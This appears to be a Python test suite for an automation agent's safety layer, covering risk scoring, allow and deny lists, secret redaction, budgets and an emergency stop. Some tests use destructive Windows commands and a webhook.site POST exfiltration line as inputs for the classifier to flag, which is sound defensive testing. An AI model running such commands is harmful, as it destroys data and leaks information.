"""The safety layer: risk classification, allow/deny, redaction, the guard,
loop detection, budgets and the emergency latch.

This is the most important test file in the project. If the policy is wrong,
nothing else matters.
"""
import tempfile
import unittest
from pathlib import Path

from tests._support import ROOT  # noqa: F401
from ufo.config import SafetyConfig
from ufo.errors import BudgetExceeded, EmergencyAbort
from ufo.safety.emergency import EmergencySwitch
from ufo.safety.guard import ActionGuard, RunBudget, describe
from ufo.safety.policy import (RISK_CRITICAL, RISK_HIGH, RISK_LOW, RISK_MEDIUM,
                               ActionPolicy, RiskClassifier)
from ufo.safety.secrets import SecretStore, redact, scrub_data


class TestRisk(unittest.TestCase):
    def setUp(self):
        self.c = RiskClassifier()

    def test_harmless_actions_are_low(self):
        self.assertEqual(self.c.classify("click", "Save button").level, RISK_LOW)

    def test_destructive_names_are_high(self):
        for name in ("Delete", "Remove", "Send", "Pay", "Uninstall", "Shut down"):
            self.assertGreaterEqual(
                self.c.classify("click", name).level, RISK_HIGH,
                f"{name!r} should be high risk")

    def test_shell_destructive_patterns_are_critical(self):
        for cmd in ("format c:", "Remove-Item C:\\x -Recurse",
                    "Stop-Computer", "reg delete HKLM\\Software",
                    "Set-ExecutionPolicy Unrestricted"):
            self.assertEqual(
                self.c.classify("run_command", "", cmd, kind="shell").level,
                RISK_CRITICAL, f"{cmd!r} should be critical")

    def test_exfiltration_is_critical(self):
        risk = self.c.classify(
            "run_command", "",
            "Invoke-WebRequest https://webhook.site/abc -Method Post",
            kind="shell")
        self.assertEqual(risk.level, RISK_CRITICAL)

    def test_read_only_shell_is_low(self):
        self.assertEqual(
            self.c.classify("run_command", "", "Get-ChildItem", kind="shell").level,
            RISK_LOW)

    def test_sensitive_fields_are_critical_to_write_into(self):
        for field in ("Password", "CVV", "Card number", "SSN", "One-time PIN"):
            self.assertEqual(
                self.c.classify("type", field, "x").level, RISK_CRITICAL,
                f"{field!r} must be critical")
        self.assertEqual(self.c.classify("click", "Password").level, RISK_LOW,
                         "reading a password label is not itself writing to it")

    def test_protected_windows(self):
        for title in ("Credential Manager", "Windows Security", "Task Manager"):
            self.assertTrue(self.c.is_protected_window(title))
        self.assertFalse(self.c.is_protected_window("Notepad"))

    def test_network_upload_is_high(self):
        self.assertEqual(
            self.c.classify("upload", "https://example.com", kind="network").level,
            RISK_HIGH)

    def test_process_kill_is_high(self):
        self.assertGreaterEqual(
            self.c.classify("terminate", "chrome", kind="process").level, RISK_HIGH)


class TestPolicy(unittest.TestCase):
    def test_empty_allowlist_allows_nothing(self):
        p = ActionPolicy()
        self.assertFalse(p.window_allowed("Notepad"))
        self.assertFalse(p.window_allowed(""))

    def test_regex_allowlist(self):
        p = ActionPolicy(allowlist=[r"Notepad", r"^Microsoft Outlook"])
        self.assertTrue(p.window_allowed("*notes* - Notepad"))
        self.assertTrue(p.window_allowed("Microsoft Outlook - Inbox"))
        self.assertFalse(p.window_allowed("Chrome"))

    def test_denylist_beats_allowlist(self):
        p = ActionPolicy(allowlist=[".*"], denylist=["Credential Manager"])
        self.assertFalse(p.window_allowed("Credential Manager"))
        self.assertTrue(p.window_allowed("Notepad"))

    def test_protected_window_never_allowed(self):
        p = ActionPolicy(allowlist=[".*"])
        self.assertFalse(p.window_allowed("Windows Security"))

    def test_literal_matching_mode(self):
        p = ActionPolicy(allowlist=["Notepad"], allowlist_is_regex=False)
        self.assertTrue(p.window_allowed("Untitled - Notepad"))
        self.assertFalse(p.window_allowed("Note"))

    def test_subject_must_be_allowed(self):
        p = ActionPolicy(allowlist=["Notepad"])
        d = p.evaluate("click", "Save", subject="Chrome")
        self.assertFalse(d.allowed)
        self.assertIn("allowlist", d.reason)

    def test_sensitive_field_write_blocked(self):
        p = ActionPolicy(allowlist=["Notepad"])
        d = p.evaluate("type", "Password", "hunter2")
        self.assertFalse(d.allowed)
        self.assertIn("credential", d.reason.lower())

    def test_sensitive_field_write_can_be_opted_into(self):
        p = ActionPolicy(allowlist=["Notepad"], allow_sensitive_fields=True,
                         block_at_or_above=99)
        self.assertTrue(p.evaluate("type", "Password", "x").allowed)

    def test_block_threshold(self):
        p = ActionPolicy(allowlist=["Notepad"], block_at_or_above=RISK_HIGH)
        self.assertFalse(p.evaluate("click", "Delete everything").allowed)

    def test_bad_regex_falls_back_to_literal(self):
        p = ActionPolicy(allowlist=["Notepad["])
        self.assertTrue(p.window_allowed("Notepad["))


class TestRedaction(unittest.TestCase):
    def test_provider_keys(self):
        for key in ("sk-abcdef0123456789ABCDEF",
                    "sk-ant-abcdef0123456789ABCDEF",
                    "AIza" + "a" * 35,
                    "ghp_" + "b" * 30,
                    "xoxb-1234567890-abcdef"):
            self.assertIn("[REDACTED]", redact(f"my key is {key}"), key)

    def test_google_aq_prefixed_keys(self):
        """Google's current AI Studio keys start with AQ., not AIza.

        Synthetic keys of the real length and alphabet. A live key must never
        appear in a test file: it would then be committed, and the test would
        keep passing after the key is rotated, hiding a real regression.
        """
        realistic = "AQ." + ("Ab8R" * 13)[:50]
        self.assertEqual(len(realistic), 53)
        for key in (realistic, "AQ." + "z" * 40, "AQ.short"):
            with self.subTest(length=len(key)):
                if len(key) > 12:
                    self.assertIn("[REDACTED]", redact(key))
                    self.assertNotIn(key[:12], redact(f"GEMINI_API_KEY={key}"))

    def test_named_credentials(self):
        self.assertNotIn("hunter2", redact("password=hunter2"))
        self.assertNotIn("secret99", redact('api_key: "secret99"'))

    def test_cards_and_ssn(self):
        self.assertIn("[REDACTED]", redact("4111 1111 1111 1111"))
        self.assertIn("[REDACTED]", redact("123-45-6789"))

    def test_ordinary_text_untouched(self):
        text = "Click the Save button and type hello into the document."
        self.assertEqual(redact(text), text)

    def test_scrub_data_walks_structures(self):
        payload = {"OPENAI_API_KEY": "sk-abcdef0123456789ABCDEF",
                   "nested": ["password: hunter2", "fine"]}
        out = scrub_data(payload)
        self.assertEqual(out["OPENAI_API_KEY"], "[REDACTED]")
        self.assertIn("[REDACTED]", out["nested"][0])
        self.assertEqual(out["nested"][1], "fine")


class TestSecretStore(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.path = Path(self.dir.name) / "secrets.json"

    def tearDown(self):
        self.dir.cleanup()

    def test_round_trip(self):
        s = SecretStore(self.path).set("a", "b")
        self.assertEqual(s.get("a"), "b")
        self.assertEqual(SecretStore(self.path).get("a"), "b")
        self.assertIn("a", s.names())

    def test_remove(self):
        s = SecretStore(self.path)
        s.set("a", "b")
        self.assertTrue(s.unset("a"))
        self.assertFalse(s.unset("a"))

    def test_env_wins_over_vault(self):
        import os

        s = SecretStore(self.path)
        s.set("k", "from-vault")
        os.environ["UFO_TEST_SECRET"] = "from-env"
        try:
            self.assertEqual(s.from_env("k", "UFO_TEST_SECRET"), "from-env")
            self.assertEqual(s.from_env("k", "UFO_NOT_SET_ANYWHERE"), "from-vault")
        finally:
            del os.environ["UFO_TEST_SECRET"]


class FakeSwitch(EmergencySwitch):
    pass


class TestGuard(unittest.TestCase):
    def build(self, **kw):
        cfg = SafetyConfig(allowlist=["Notepad"], **kw)
        policy = ActionPolicy.from_config(cfg)
        return ActionGuard(
            policy=policy, config=cfg,
            emergency_switch=FakeSwitch(),
            narrate=lambda _t: None,
            confirm=kw.pop("confirm", None) or (lambda m, r: True),
        )

    def test_allows_and_executes(self):
        g = self.build()
        calls = []
        result = g.guard("click", "Save", kind="ui", subject="Notepad",
                         execute=lambda: calls.append(1) or "ok")
        self.assertTrue(result.executed)
        self.assertEqual(result.result, "ok")
        self.assertEqual(len(calls), 1)

    def test_dry_run_never_executes(self):
        g = self.build(dry_run=True)
        calls = []
        result = g.guard("click", "Save", subject="Notepad",
                         execute=lambda: calls.append(1))
        self.assertFalse(result.executed)
        self.assertEqual(result.reason, "dry_run")
        self.assertEqual(calls, [])

    def test_blocked_subject_does_not_execute(self):
        g = self.build()
        calls = []
        result = g.guard("click", "Save", subject="Chrome",
                         execute=lambda: calls.append(1))
        self.assertFalse(result.executed)
        self.assertEqual(calls, [])

    def test_declined_confirmation_does_not_execute(self):
        g = ActionGuard(
            policy=ActionPolicy(allowlist=["Notepad"]),
            config=SafetyConfig(allowlist=["Notepad"], confirm_risk_at_or_above=0),
            emergency_switch=FakeSwitch(),
            narrate=lambda _t: None,
            confirm=lambda m, r: False,
        )
        calls = []
        result = g.guard("click", "Save", subject="Notepad",
                         execute=lambda: calls.append(1))
        self.assertFalse(result.executed)
        self.assertEqual(result.reason, "declined_by_user")
        self.assertEqual(calls, [])

    def test_missing_confirmer_denies(self):
        g = ActionGuard(
            policy=ActionPolicy(allowlist=["Notepad"]),
            config=SafetyConfig(allowlist=["Notepad"], confirm_risk_at_or_above=0),
            emergency_switch=FakeSwitch(),
            narrate=lambda _t: None,
            confirm=None,
        )
        result = g.guard("click", "Save", subject="Notepad", execute=lambda: "x")
        self.assertFalse(result.executed)

    def test_emergency_latch_blocks_everything(self):
        g = self.build()
        g.emergency_switch.trip("test")
        calls = []
        with self.assertRaises(EmergencyAbort):
            g.guard("click", "Save", subject="Notepad", execute=lambda: calls.append(1))
        self.assertEqual(calls, [])

    def test_loop_detection(self):
        g = self.build(loop_detection_threshold=3)
        g.note_action("click", "Save")
        g.note_action("click", "Save")
        self.assertFalse(g.looping, "two identical actions are not a loop yet")
        g.note_action("click", "Save")
        self.assertTrue(g.looping, "three identical actions in a row is a loop")

    def test_different_actions_reset_the_loop_count(self):
        g = self.build(loop_detection_threshold=2)
        g.note_action("click", "Save")
        g.note_action("click", "Open")
        g.note_action("click", "Save")
        self.assertFalse(g.looping)

    def test_action_budget(self):
        g = self.build(max_actions_per_run=2)
        g.active_budget.charge_action()
        g.active_budget.charge_action()
        with self.assertRaises(BudgetExceeded):
            g.active_budget.charge_action()

    def test_cost_budget(self):
        budget = RunBudget(max_cost_usd=0.01)
        budget.charge_llm(0.01)          # exactly at budget: allowed
        self.assertEqual(budget.cost_usd, 0.01)
        with self.assertRaises(BudgetExceeded):
            budget.charge_llm(0.005)      # the call that would overspend
        self.assertEqual(budget.cost_usd, 0.01, "rejected call must not be charged")

    def test_llm_call_budget(self):
        budget = RunBudget(max_llm_calls=1)
        budget.charge_llm(0.0)
        with self.assertRaises(BudgetExceeded):
            budget.charge_llm(0.0)

    def test_wall_clock_budget(self):
        budget = RunBudget(max_wall_seconds=0)
        with self.assertRaises(BudgetExceeded):
            budget.check()

    def test_describe_is_readable(self):
        text = describe("type", "Search box", "hello", kind="ui")
        self.assertIn("hello", text)
        self.assertIn("Search box", text)
        self.assertIn("run the command", describe("run_command", "shell", "dir",
                                                 kind="shell"))


class TestEmergencyHookPrototypes(unittest.TestCase):
    """The panic hotkey must actually work on 64-bit Windows.

    LPARAM and LRESULT are pointer-sized. ctypes marshals undeclared integer
    arguments as a 32-bit c_int, so a real hook's lparam overflowed and

        ctypes.ArgumentError: argument 4: OverflowError: int too long

    was raised *inside* the hook callback. ctypes discards an exception raised
    in a callback, so the hook kept installing and Ctrl+Alt+Q never tripped —
    silently, which is the worst way for the emergency stop to fail.

    These assert against a stub DLL rather than the real user32: declaring
    argtypes mutates process-global ctypes state, and a test should not leave
    that behind for the rest of the suite.
    """

    NAMES = ("CallNextHookEx", "GetAsyncKeyState", "SetWindowsHookExW",
             "UnhookWindowsHookEx", "PostThreadMessageW")

    def _apply(self):
        import importlib
        import types
        from unittest import mock

        mod = importlib.import_module("ufo.safety.emergency")
        stub = types.SimpleNamespace()
        for name in self.NAMES:
            setattr(stub, name, types.SimpleNamespace(argtypes=None, restype=None))
        with mock.patch.object(mod, "user32", stub):
            mod.emergency._declare_prototypes()
        return stub

    def test_callnexthookex_takes_pointer_sized_arguments(self):
        import ctypes

        stub = self._apply()
        call = stub.CallNextHookEx
        self.assertEqual(list(call.argtypes),
                         [ctypes.c_void_p, ctypes.c_long, ctypes.c_ulonglong,
                          ctypes.c_longlong])
        self.assertIs(call.restype, ctypes.c_longlong)

    def test_a_realistic_lparam_fits_the_declared_type(self):
        import ctypes

        stub = self._apply()
        self.assertIs(stub.CallNextHookEx.argtypes[3], ctypes.c_longlong)
        probe = 0x0000_7FFF_1234_5678
        self.assertGreater(probe, ctypes.c_int(-1).value,
                           "the probe must exceed 32 bits to be meaningful")
        self.assertLessEqual(probe, 2 ** 63 - 1,
                             "the probe must fit a 64-bit LPARAM")

    def test_keystate_and_hook_install_are_declared(self):
        import ctypes

        stub = self._apply()
        self.assertIs(stub.GetAsyncKeyState.restype, ctypes.c_short)
        self.assertEqual(list(stub.SetWindowsHookExW.argtypes)[-1], ctypes.c_uint)
        self.assertEqual(list(stub.UnhookWindowsHookEx.argtypes), [ctypes.c_void_p])

    def test_a_dll_missing_a_function_is_not_fatal(self):
        """Windows exposes all of these, but a trimmed DLL must not make the
        safety path raise."""
        import importlib
        import types
        from unittest import mock

        mod = importlib.import_module("ufo.safety.emergency")
        stub = types.SimpleNamespace(
            CallNextHookEx=types.SimpleNamespace(argtypes=None, restype=None))
        with mock.patch.object(mod, "user32", stub):
            mod.emergency._declare_prototypes()      # must not raise
        self.assertEqual(stub.CallNextHookEx.argtypes[3].__name__, "c_longlong")


class TestRiskFloor(unittest.TestCase):
    """The catalog states a risk for every capability; the guard must honour it."""

    def setUp(self):
        self.c = RiskClassifier()

    def test_floor_raises_a_guess(self):
        """A catalog risk outranks what the word list guessed from the text."""
        risk = self.c.classify("clip_get", "clipboard", "", kind="fs", floor=3)
        self.assertEqual(risk.level, RISK_HIGH)
        self.assertIn("catalog states a risk floor of 3", risk.reasons)

    def test_floor_does_not_lower_a_higher_guess(self):
        """A floor is a minimum, not an override. A destructive name still wins."""
        guessed = self.c.classify("remove", "C:/important", "", kind="fs")
        self.assertGreaterEqual(guessed.level, RISK_HIGH)
        floored = self.c.classify("remove", "C:/important", "", kind="fs", floor=1)
        self.assertEqual(floored.level, guessed.level)

    def test_floor_zero_changes_nothing(self):
        plain = self.c.classify("click", "Save button")
        floored = self.c.classify("click", "Save button", floor=0)
        self.assertEqual(plain.level, floored.level)

    def test_locking_the_workstation_is_not_a_system_change(self):
        """`kind="system"` scores any action critical, which is wrong for a lock."""
        risk = self.c.classify("sec_lock", "", "", kind="ui", floor=0)
        self.assertLess(risk.level, RISK_CRITICAL)

    def test_floor_reaches_the_policy_decision(self):
        policy = ActionPolicy(allowlist=[".*"], block_at_or_above=4)
        decision = policy.evaluate("backup_encrypt", "", "", kind="shell", floor=4)
        self.assertFalse(decision.allowed)
        self.assertEqual(decision.risk.level, RISK_CRITICAL)

    def test_floor_reaches_the_guard(self):
        """The whole point: the executor's floor argument must reach classify()."""
        cfg = SafetyConfig(allowlist=[".*"], confirm_risk_at_or_above=2)
        guard = ActionGuard(policy=ActionPolicy.from_config(cfg), config=cfg,
                            confirm=lambda message, risk: False)
        result = guard.guard("catalog_reads", "", "", kind="fs", floor=4)
        self.assertFalse(result.allowed)
        self.assertEqual(result.risk.level, RISK_CRITICAL)


class TestStandingConstraints(unittest.TestCase):
    """Category 45: constraints the user sets in words, enforced on every action.

    These are promises rather than probabilities, so they are checked before the
    allowlist and the risk score: a risk level can be argued with, "never touch
    this folder" cannot.
    """

    def policy(self, **kwargs) -> ActionPolicy:
        return ActionPolicy(allowlist=[".*"], classifier=RiskClassifier(), **kwargs)

    def blocked(self, policy, action, target="", args="", kind="ui") -> bool:
        return bool(policy.constraints(action, target, args, kind=kind))

    # ---- read-only mode ----
    def test_read_only_allows_reads(self):
        p = self.policy(read_only=True)
        for action, kind, args in [("hw_battery", "ui", ""),
                                   ("clip_get", "fs", ""),
                                   ("hw_status", "shell", "Get-CimInstance Win32_OperatingSystem"),
                                   ("app_list", "shell", "Get-AppxPackage | Select-Object Name"),
                                   ("sec_events", "shell", "Get-WinEvent -FilterHashtable @{}")]:
            self.assertFalse(self.blocked(p, action, args=args, kind=kind),
                             f"{action} should be allowed in read-only mode")

    def test_read_only_blocks_changes(self):
        p = self.policy(read_only=True)
        for action, kind, target, args in [
                ("set_volume", "system", "40", ""),
                ("file_delete", "fs", "C:/x/a.txt", ""),
                ("file_rename", "fs", "C:/x/a.txt", "b.txt"),
                ("net_flush", "shell", "", "ipconfig /flushdns"),
                ("fix_sfc", "shell", "", "sfc /scannow")]:
            self.assertTrue(self.blocked(p, action, target, args, kind),
                            f"{action} must be refused in read-only mode")

    def test_read_only_fails_closed_on_an_unknown_command(self):
        """No command line to inspect is not evidence that nothing changes."""
        p = self.policy(read_only=True)
        self.assertTrue(self.blocked(p, "hw_status", kind="shell"))

    def test_ipconfig_flushdns_is_not_read_only(self):
        """`ipconfig /all` observes; `/flushdns` changes. The switch decides."""
        c = RiskClassifier()
        self.assertFalse(c.changes_machine("x", "shell", "ipconfig /all"))
        self.assertTrue(c.changes_machine("x", "shell", "ipconfig /flushdns"))
        self.assertTrue(c.changes_machine("x", "shell", "ipconfig /release"))

    # ---- never touch a folder ----
    def test_never_paths_blocks_inside_and_on_the_path(self):
        p = self.policy(never_paths=["C:/Users/x/Downloads"])
        self.assertTrue(self.blocked(p, "file_read", "C:/Users/x/Downloads", kind="fs"))
        self.assertTrue(self.blocked(p, "file_read", "C:/Users/x/Downloads/a.txt", kind="fs"))
        self.assertFalse(self.blocked(p, "file_read", "C:/Users/x/Documents/a.txt", kind="fs"))

    def test_never_paths_does_not_block_a_sibling_with_the_same_suffix(self):
        p = self.policy(never_paths=["C:/work/Downloads"])
        self.assertFalse(self.blocked(p, "file_read", "C:/work/Downloads2/a.txt", kind="fs"))

    # ---- never open a site ----
    def test_never_domains_matches_host_and_www(self):
        p = self.policy(never_domains=["bank.example.com"])
        self.assertTrue(self.blocked(p, "web_open", "https://bank.example.com/login", kind="network"))
        self.assertTrue(self.blocked(p, "web_open", "https://www.bank.example.com/x", kind="network"))

    def test_never_domains_does_not_match_a_lookalike(self):
        """`bank.example.com.evil.net` is a different site, and a real risk."""
        p = self.policy(never_domains=["bank.example.com"])
        self.assertFalse(self.blocked(p, "web_open",
                                      "https://bank.example.com.evil.net/", kind="network"))

    # ---- work only in one folder ----
    def test_work_only_in_allows_nested_paths(self):
        p = self.policy(work_only_in="C:/work/proj")
        self.assertFalse(self.blocked(p, "file_read", "C:/work/proj/a.txt", kind="fs"))
        self.assertFalse(self.blocked(p, "file_read", "C:/work/proj/sub/b.txt", kind="fs"))

    def test_work_only_in_blocks_outside_paths(self):
        p = self.policy(work_only_in="C:/work/proj")
        self.assertTrue(self.blocked(p, "file_read", "C:/work/other/b.txt", kind="fs"))
        self.assertTrue(self.blocked(p, "file_read", "C:/Windows/System32/x.dll", kind="fs"))

    # ---- password before deleting ----
    def test_password_before_delete_covers_underscore_names(self):
        """`file_delete` is word-bounded: without separator normalisation it was
        not seen as a deletion at all."""
        p = self.policy(require_password_for_delete=True)
        for action in ("file_delete", "delete", "remove", "wipe"):
            self.assertTrue(self.blocked(p, action, "C:/x/a.txt", kind="fs"), action)
        for action in ("file_rename", "file_read", "file_copy"):
            self.assertFalse(self.blocked(p, action, "C:/x/a.txt", kind="fs"), action)

    # ---- protected folders ----
    def test_system_folders_are_never_written(self):
        p = self.policy(protected_folders=["Windows"])
        self.assertTrue(self.blocked(p, "file_write", "C:/Windows/System32/x.dll", kind="fs"))

    # ---- integration with evaluate() ----
    def test_constraints_are_enforced_by_evaluate(self):
        p = self.policy(read_only=True)
        decision = p.evaluate("set_volume", "40", "", kind="system")
        self.assertFalse(decision.allowed)
        self.assertIn("read-only", decision.reason)

    def test_constraints_run_before_the_allowlist(self):
        """Even a perfectly allowlisted action is refused by a constraint."""
        p = self.policy(never_paths=["C:/secret"])
        decision = p.evaluate("file_read", "C:/secret/a.txt", "", kind="fs")
        self.assertFalse(decision.allowed)
        self.assertIn("never-touch", decision.reason)

    def test_from_config_carries_every_constraint(self):
        cfg = SafetyConfig(read_only=True, never_paths=["C:/a"],
                            never_domains=["x.com"], work_only_in="C:/b",
                            require_password_for_delete=True,
                            protected_folders=["Windows"])
        p = ActionPolicy.from_config(cfg)
        self.assertTrue(p.read_only)
        self.assertEqual(p.never_paths, ["C:/a"])
        self.assertEqual(p.never_domains, ["x.com"])
        self.assertEqual(p.work_only_in, "C:/b")
        self.assertTrue(p.require_password_for_delete)
        self.assertEqual(p.protected_folders, ["Windows"])


class TestDestructiveNames(unittest.TestCase):
    """Action names use underscores. Word-bounded patterns must still see them."""

    def setUp(self):
        self.c = RiskClassifier()

    def test_underscore_names_are_destructive(self):
        for name in ("file_delete", "app_uninstall", "remove_item",
                     "sec.secure_delete", "delete-everything"):
            self.assertTrue(self.c.is_destructive(name, "C:/x/a.txt"), name)

    def test_underscore_names_that_are_not_destructive(self):
        for name in ("file_find", "clip_get", "hw_battery", "file_list"):
            self.assertFalse(self.c.is_destructive(name, "C:/x/a.txt"), name)


if __name__ == "__main__":
    unittest.main()
